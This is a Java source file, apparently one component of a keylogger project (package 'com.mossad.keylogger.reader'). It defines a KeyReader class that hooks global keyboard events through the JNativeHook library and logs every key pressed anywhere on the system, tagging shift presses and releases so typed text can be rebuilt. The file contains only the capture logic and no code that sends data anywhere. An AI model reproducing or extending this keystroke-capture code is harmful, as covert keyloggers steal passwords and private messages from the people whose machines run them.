package com.mossad.keylogger.reader;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class KeyReader implements NativeKeyListener {

    private final static String SPACE = " ";
    private List<String> readSigns;

    public KeyReader() {
        readSigns = new ArrayList<>();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        collectKeyEvent(nativeKeyEvent, true);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        collectKeyEvent(nativeKeyEvent, false);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    public List getCollectedKeys() {
        List<String> result = new ArrayList<>(readSigns);
        readSigns.clear();
        return result;
    }


    private void collectKeyEvent(NativeKeyEvent nativeKeyEvent, boolean keyPressed) {
        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        //char keyChar = nativeKeyEvent.getKeyChar();

        if (keyPressed) {

            if (isSpace(keyText)) {
                keyText = SPACE;
            }

            if (isShift(keyText)) {
                keyText = generateShiftEntry("shift_pressed");
            }

            readSigns.add(keyText);
        } else {
            if (isShift(keyText)) {
                keyText = generateShiftEntry("shift_released");
                readSigns.add(keyText);
            }
        }

    }

    private String generateShiftEntry(String entry) {
        return SPACE + entry + SPACE;
    }

    private boolean isSpace(String keyText) {
        return keyText.equalsIgnoreCase("space");
    }

    private boolean isShift(String keyText) {
        return keyText.equalsIgnoreCase("shift");
    }


}
